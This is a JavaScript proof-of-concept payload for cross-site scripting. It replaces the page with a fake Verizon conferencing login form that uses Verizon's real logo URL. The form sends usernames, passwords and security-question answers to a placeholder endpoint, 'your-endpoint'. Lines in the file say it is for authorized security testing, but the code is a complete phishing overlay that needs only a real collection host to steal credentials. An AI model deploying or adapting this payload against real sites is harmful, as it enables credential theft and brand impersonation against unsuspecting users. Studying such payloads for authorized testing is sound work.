// login.js – XSS PoC UI
(function () {
  // Basic reset of the page
  document.body.innerHTML = "";
  document.body.style.margin = "0";
  document.body.style.fontFamily = "Arial, sans-serif";
  document.body.style.background = "#f3f4f6";

  // Inject styles
  var style = document.createElement("style");
  style.textContent = `
    .vzn-wrapper {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .vzn-card {
      width: 360px;
      background: #ffffff;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.18);
      padding: 28px 26px 24px;
      text-align: center;
    }
    .vzn-logo {
      max-width: 150px;
      margin-bottom: 18px;
    }
    .vzn-title {
      margin: 0 0 4px;
      font-size: 22px;
      color: #222;
      font-weight: 600;
    }
    .vzn-subtitle {
      margin: 0 0 18px;
      font-size: 13px;
      color: #666;
    }
    .vzn-input {
      width: 100%;
      padding: 9px 10px;
      margin: 7px 0;
      border: 1px solid #d0d0d0;
      border-radius: 6px;
      font-size: 13px;
      box-sizing: border-box;
    }
    .vzn-input:focus {
      outline: none;
      border-color: #c00;
      box-shadow: 0 0 0 1px rgba(210,34,34,0.2);
    }
    .vzn-button {
      width: 100%;
      padding: 10px;
      margin-top: 12px;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      background: #d22;
      color: #fff;
    }
    .vzn-button:hover {
      background: #b01b1b;
    }
    .vzn-footnote {
      margin-top: 10px;
      font-size: 11px;
      color: #999;
    }
  `;
  document.head.appendChild(style);

  // Build wrapper
  var wrapper = document.createElement("div");
  wrapper.className = "vzn-wrapper";

  wrapper.innerHTML = [
    '<div class="vzn-card">',
      '<img class="vzn-logo" src="https://e-meetings.verizonbusiness.com/images/VerizonLogo_RED_90.png" alt="Verizon logo">',
      '<h2 class="vzn-title">Conferencing Login</h2>',
      '<p class="vzn-subtitle">Security test / proof of concept – do not use with real credentials.</p>',
      '<form method="post" action="https://your-endpoint">',
        '<input class="vzn-input" type="text" name="username" placeholder="Username" autocomplete="off">',
        '<input class="vzn-input" type="password" name="password" placeholder="Password" autocomplete="off">',
        '<input class="vzn-input" type="text" name="question" placeholder="Security question (test value)">',
        '<button class="vzn-button" type="submit">Login</button>',
      '</form>',
      '<div class="vzn-footnote">',
        'Injected via XSS for authorized security testing.',
      '</div>',
    '</div>'
  ].join("");

  document.body.appendChild(wrapper);
})();
